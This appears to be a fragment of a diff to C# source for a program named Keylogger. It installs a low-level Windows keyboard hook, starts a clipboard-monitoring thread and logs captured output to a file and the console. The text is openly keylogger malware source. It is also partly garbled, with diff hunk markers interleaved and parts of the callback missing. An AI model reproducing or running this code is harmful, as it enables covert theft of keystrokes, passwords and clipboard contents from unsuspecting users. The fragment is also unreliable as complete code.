using SharpClipboard;
using System.Threading;

namespace Keylogger
{
@@ -1092,56 +1092,6 @@ public enum WM : uint
            HSHELL_WINDOWREPLACED = 13
        }
  private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
@@ -1528,21 +1478,48 @@ private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
         private static void BootClipboard()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }

        static void Main(string[] args)
        {
            try
            {
                Trace.Listeners.Clear();
                TextWriterTraceListener twtl = new TextWriterTraceListener(Program.logName);
                twtl.Name = "TextLogger";
                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
                ctl.TraceOutputOptions = TraceOptions.DateTime;

                Trace.Listeners.Add(twtl);
                Trace.Listeners.Add(ctl);
                Trace.AutoFlush = true;


                // Start the clipboard
                ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
                Thread clipboardThread = new Thread(clipboardThreadStart);
                clipboardThread.Start();
                //Application.Run(new ClipboardNotification.NotificationForm());
                HookProc callback = CallbackFunction;
                var module = Process.GetCurrentProcess().MainModule.ModuleName;
                var moduleHandle = GetModuleHandle(module);
                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);

                while (true)
                {
                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    System.Threading.Thread.Sleep(5);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }
    }
}
